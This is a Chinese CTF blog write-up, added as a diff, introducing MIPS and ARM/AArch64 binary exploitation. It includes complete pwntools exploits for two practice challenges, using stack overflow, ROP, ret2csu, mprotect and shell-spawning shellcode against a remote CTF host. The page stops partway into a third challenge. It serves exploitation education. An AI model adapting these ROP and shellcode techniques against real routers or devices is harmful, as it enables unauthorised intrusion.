@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="前言厌倦了x86&#x2F;x64 平台下的二进制漏洞利用，来看看mips&#x2F;arm平台下的pwn是如何达到利用的。众所周知，mips&#x2F;arm架构cpu主要用于嵌入式设备，比如路由器这些。当我们在x86&#x2F;x64平台练习到一定境界后，再去探索一个新的平台下的漏洞利用，我们可以借鉴以前的方法，总之，思想都是一样的。只不过是指令的样子不同而已。 MIPS架构的pwnmips、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mips&#x2F;arm pwn初探">
+<meta property="og:url" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="前言厌倦了x86&#x2F;x64 平台下的二进制漏洞利用，来看看mips&#x2F;arm平台下的pwn是如何达到利用的。众所周知，mips&#x2F;arm架构cpu主要用于嵌入式设备，比如路由器这些。当我们在x86&#x2F;x64平台练习到一定境界后，再去探索一个新的平台下的漏洞利用，我们可以借鉴以前的方法，总之，思想都是一样的。只不过是指令的样子不同而已。 MIPS架构的pwnmips、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image1.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image2.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image3.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image4.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image5.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image6.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image7.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image8.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image9.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image10.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image11.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image12.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image13.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image14.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image15.png">
+<meta property="article:published_time" content="2020-04-02T14:45:11.000Z">
+<meta property="article:modified_time" content="2025-06-25T08:47:32.877Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="aarch64">
+<meta property="article:tag" content="mips">
+<meta property="article:tag" content="arm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image1.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>mips/arm pwn初探 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          mips/arm pwn初探
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-02 22:45:11" itemprop="dateCreated datePublished" datetime="2020-04-02T22:45:11+08:00">2020-04-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-25 16:47:32" itemprop="dateModified" datetime="2025-06-25T16:47:32+08:00">2025-06-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/IOT/" itemprop="url" rel="index"><span itemprop="name">IOT</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>厌倦了x86&#x2F;x64 平台下的二进制漏洞利用，来看看mips&#x2F;arm平台下的pwn是如何达到利用的。众所周知，mips&#x2F;arm架构cpu主要用于嵌入式设备，比如路由器这些。当我们在x86&#x2F;x64平台练习到一定境界后，再去探索一个新的平台下的漏洞利用，我们可以借鉴以前的方法，总之，思想都是一样的。只不过是指令的样子不同而已。</p>
+<h2 id="MIPS架构的pwn"><a href="#MIPS架构的pwn" class="headerlink" title="MIPS架构的pwn"></a>MIPS架构的pwn</h2><h3 id="mips、mipsel的区别"><a href="#mips、mipsel的区别" class="headerlink" title="mips、mipsel的区别"></a>mips、mipsel的区别</h3><p>mips是大端(big-endian)架构，而mipsel是小端(little-endian)架构。指令的用法是差不多的。</p>
+<h3 id="Pwn中需要重点了解的Mips指令"><a href="#Pwn中需要重点了解的Mips指令" class="headerlink" title="Pwn中需要重点了解的Mips指令"></a>Pwn中需要重点了解的Mips指令</h3><h4 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h4><p>用$a0~$a3传递函数的前4个参数，记忆方法，寄存器名字a实际为argument的缩写。多余的参数用栈传递，可以写一个简单的c程序编译后，反汇编观察，悟出规律。</p>
+<h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><p>一般用$v0~$v1寄存器传递。v也就是value的缩写。</p>
+<h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><p>j指令跳转到某个标签处，单纯的jmp</p>
+<p>jr指令用于跳转到寄存器里的地址值指向的地方。</p>
+<p>jal 跳转时，会将返回地址存入$ra寄存器。</p>
+<p>jalr 与jal指令类似，只不过后面的对象为寄存器。</p>
+<p>$ra寄存器，ra为，return address的缩写，一般用于存储返回地址，一个函数结尾往往会从栈里弹出一个值赋值给$ra寄存器，然后jr $ra。</p>
+<h4 id="内存读取指令"><a href="#内存读取指令" class="headerlink" title="内存读取指令"></a>内存读取指令</h4><p>sw register,addr指令，sw即store word的缩写（对应的有store byte）,将register寄存器里的值写入到addr地址处。</p>
+<p>lw register,addr指令，lw即load word的缩写（对应的有load byte）,读取addr处的数据，放入register寄存器。</p>
+<h4 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h4><p>la指令，相当于x86的lea</p>
+<p>lai指令，i的意思是immediate立即数，即后面的对象为立即数。</p>
+<p>la $a0,1($s0)指令，带有偏移的寻址，它的作用是$a0 &#x3D; 1 + $s0</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="安洵杯axb-2019-mips"><a href="#安洵杯axb-2019-mips" class="headerlink" title="安洵杯axb_2019_mips"></a>安洵杯axb_2019_mips</h4><p>首先，最开始依然是检查程序的保护机制，发现所有保护都没开。</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image1.png" class="">
+
+<p>qemu-mipsel运行，提示缺少库，最快速的解决方法是下载现成的库，省去自己编译。Mipsel的uclibc库在这里<a href="https://github.com/MonkeyJacky/mipsel-linux-uclibc">https://github.com/MonkeyJacky/mipsel-linux-uclibc</a></p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image2.png" class="">
+
+<p>然后，我们使用-L加载库，就可以运行了</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image3.png" class="">
+
+<p>接下来，我们用IDA分析一下程序，vuln函数里存在栈溢出。IDA不能查看mips的伪代码，我们可以用ghidra工具来查看。</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image4.png" class="">
+
+<p>由于代码过于简单，我们可以直接看到漏洞。$fp寄存器可以理解为x86下的ebp。由于题目没有给我们uclibc的版本，因此，我们泄露函数地址后，也很难确定system这些函数的地址。但是想到本题没有开NX保护，于是，我们可以ret2shellcode。但是，我们还不知道栈地址。由于没有开启PIE，因此我们可以先rop调用read向bss段输入shellcode，然后栈迁移到bss段。</p>
+<h5 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h5><p>仍然使用ROPgadget工具来找，然后，我们找一下能够控制a0~a3寄存器的gadgets，发现，最多可以自由控制$a0寄存器。这意味着我们可以执行带一个参数的函数。如果题目给了我们uclibc，那么可以很容易利用rop，构造system(“&#x2F;bin&#x2F;sh”)。但是，题目没有给我们uclibc。想要控制read的3个参数，在mips下没有那么轻松。或许我们可以ret2text。</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image5.png" class="">
+
+<p>$fp寄存器的值，在我们溢出后函数结束时，就会被栈里的值覆盖，因此,$fp可控，从而$v0可控，从而$a1可控。而$a0、$a2也在代码里控制住了。因此,我们让$a1指向bss段，从而可以向bss段输入shellcode。当read结束后, move $sp, $fp指令会使得栈发生迁移，我们在bss段的shellcode前面放置shellcode的地址，，这样shellcode的地址就会被放入到$ra寄存器，进而可以ret到shellcode。</p>
+<h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><p>用IDA的远程gdb调试，qemu加-g设置端口。</p>
+<h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#由于不知道uclibc版本，所以，我们利用栈迁移，在bss段布下shellcode执行即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-mipsel&#x27;,&#x27;-g&#x27;,&#x27;6666&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/mips_os/mipsel-linux-uclibc&#x27;,&#x27;./mips_pwn2&#x27;])</span></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-mipsel&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/mips_os/mipsel-linux-uclibc&#x27;,&#x27;./mips_pwn2&#x27;])</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27820</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x410B70</span></span><br><span class="line">text_read = <span class="number">0x4007E0</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;What&#x27;s your name:&quot;</span>,<span class="string">&quot;haivk&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"><span class="comment">#ret2shellcode</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line"><span class="comment">#fp</span></span><br><span class="line">payload += p32(bss + <span class="number">0x200</span> - <span class="number">0x40</span> + <span class="number">0x28</span>)</span><br><span class="line"><span class="comment">#调用read向bss段输入shellcode，然后ret到bss段</span></span><br><span class="line">payload += p32(text_read)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line"><span class="comment">#ra</span></span><br><span class="line">payload += p32(bss + <span class="number">0x200</span> + <span class="number">0x28</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ARM架构的pwn"><a href="#ARM架构的pwn" class="headerlink" title="ARM架构的pwn"></a>ARM架构的pwn</h2><p>掌握了mips的pwn利用方法后，arm是类似的。</p>
+<h3 id="ARM和AARCH64"><a href="#ARM和AARCH64" class="headerlink" title="ARM和AARCH64"></a>ARM和AARCH64</h3><p>ARM是32位架构，AARCH64是64位架构。</p>
+<h3 id="Pwn中需要重点了解的AARCH64指令"><a href="#Pwn中需要重点了解的AARCH64指令" class="headerlink" title="Pwn中需要重点了解的AARCH64指令"></a>Pwn中需要重点了解的AARCH64指令</h3><h4 id="传参方式-1"><a href="#传参方式-1" class="headerlink" title="传参方式"></a>传参方式</h4><p>用$a0~$a3传递函数的前4个参数，记忆方法，寄存器名字a实际为argument的缩写。多余的参数用栈传递，可以写一个简单的c程序编译后，反汇编观察，悟出规律。</p>
+<h4 id="函数返回值-1"><a href="#函数返回值-1" class="headerlink" title="函数返回值"></a>函数返回值</h4><p>W0、X1、X2寄存器用于前3个参数，其他的可以自行写一个c语言程序编译后反汇编观察。</p>
+<h4 id="跳转指令-1"><a href="#跳转指令-1" class="headerlink" title="跳转指令"></a>跳转指令</h4><p>X29寄存器作用相当于x64的rbp，X30寄存器用于保存返回地址，当**[执行RET指令时，会将X30的值赋值给PC寄存器。]{.mark}**PC寄存器即x64的rsp。</p>
+<p>b指令跳转到某个标签处，单纯的jmp</p>
+<p>BL指令用于跳转，并且会将返回地址保存在X30寄存器中。然后函数开头一般就会将这两个寄存器的值保存到栈里。</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image6.png" class="">
+
+<p>LDP X29, X30, [SP+var_s0],#0x10;RET 指令，相当于x64的pop rbp; ret。</p>
+<h4 id="内存读取指令-1"><a href="#内存读取指令-1" class="headerlink" title="内存读取指令"></a>内存读取指令</h4><p>str register,addr指令，st即store的缩写,将register寄存器里的值写入到addr地址处。</p>
+<p>ldr register,addr指令，ld即load dword的缩写,读取addr处的数据，放入register寄存器。</p>
+<p>LDP register1, register2,addr ，从addr读取两个dword，分别存入register1、register2。</p>
+<p>STP register1, register2,addr ，将register1、register2的值依次存入addr处。</p>
+<h4 id="寻址-1"><a href="#寻址-1" class="headerlink" title="寻址"></a>寻址</h4><p>ADRP X0, #label@PAGE指令，将label所处的页的基地址存入X0。</p>
+<p>接下来</p>
+<p>ADD X0, X0, #label@PAGEOFF指令，偏移加上基地址，得到label的地址。</p>
+<h4 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h4><p>假设，我们有这样的一个程序，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  fun();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们进入fun函数时，栈的布局是这样的</p>
+<hr>
+<pre><code>             数据                               所有者
+</code></pre>
+<hr>
+<pre><code>           X29 value                              fun
+
+           X30 value                              fun
+
+              buf                                 fun
+
+           X29 value                             main
+
+           X30 value                             main
+</code></pre>
+<hr>
+<p>也就是说，<strong>[函数的rbp和rip不再保存到栈底，而是栈顶！！]{.mark}</strong></p>
+<p>因此，栈溢出，修改的是调用者函数的X29和X30。</p>
+<h3 id="列题"><a href="#列题" class="headerlink" title="列题"></a>列题</h3><h4 id="shanghai2018-baby-arm"><a href="#shanghai2018-baby-arm" class="headerlink" title="shanghai2018_baby_arm"></a>shanghai2018_baby_arm</h4><p>首先，检查一下程序的保护机制</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image7.png" class="">
+
+<p>然后，我们用IDA分析一下程序</p>
+<p>很明显的栈溢出漏洞</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image8.png" class="">
+
+<p>默认导入了mprotect，所以我们可以利用ROP绕过NX保护，然后ret2shellcode。</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image9.png" class="">
+
+<p>x64下的ret2csu方法仍然可以用</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image10.png" class="">
+
+<h5 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-aarch64&#x27;,&#x27;-g&#x27;,&#x27;6666&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/arm_pwn/aarch64-libs&#x27;,&#x27;./baby_arm&#x27;])</span></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/arm_pwn/aarch64-libs&#x27;,&#x27;./baby_arm&#x27;])</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28102</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./baby_arm&#x27;</span>)</span><br><span class="line">mprotect_plt = elf.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span></span><br><span class="line"><span class="string">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span></span><br><span class="line"><span class="string">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span></span><br><span class="line"><span class="string">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span></span><br><span class="line"><span class="string">.text:00000000004008DC                 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">csu_ldr = <span class="number">0x4008CC</span></span><br><span class="line">csu_call = <span class="number">0x4008AC</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.aarch64.linux.sh(),arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(mprotect_plt) + shellcode</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>,payload)</span><br><span class="line">shellcode_addr = <span class="number">0x411068</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(csu_ldr)</span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment">#X29</span></span><br><span class="line">payload += p64(csu_call) <span class="comment">#X30</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#X19, X20</span></span><br><span class="line">payload += p64(shellcode_addr-<span class="number">8</span>) <span class="comment">#X21,,protect的plt指针</span></span><br><span class="line">payload += p64(<span class="number">0x1000007</span>) <span class="comment">#X22</span></span><br><span class="line">payload += p64(<span class="built_in">len</span>(shellcode)) <span class="comment">#X23</span></span><br><span class="line">payload += p64(shellcode_addr) <span class="comment">#X24</span></span><br><span class="line"><span class="comment">#ret2shellcode</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment">#X29</span></span><br><span class="line">payload += p64(shellcode_addr) <span class="comment">#x30</span></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h5><p>用IDA的远程gdb调试，qemu加-g设置端口。</p>
+<h3 id="ARMEABI"><a href="#ARMEABI" class="headerlink" title="ARMEABI"></a>ARMEABI</h3><p>前面介绍了arm 64位架构，armeabi是32架构，指令也类似，只不过它的栈布局与常规的一样，R11和PC的值保存在栈底。R11充当ebp，PC充当RIP。LDMFD SP!, {R11,PC}指令即相当于pop ebp;ret的作用。</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image11.png" class="">
+
+<h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><h5 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h5><p>首先，检查一下程序的保护机制</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image12.png" class="">
+
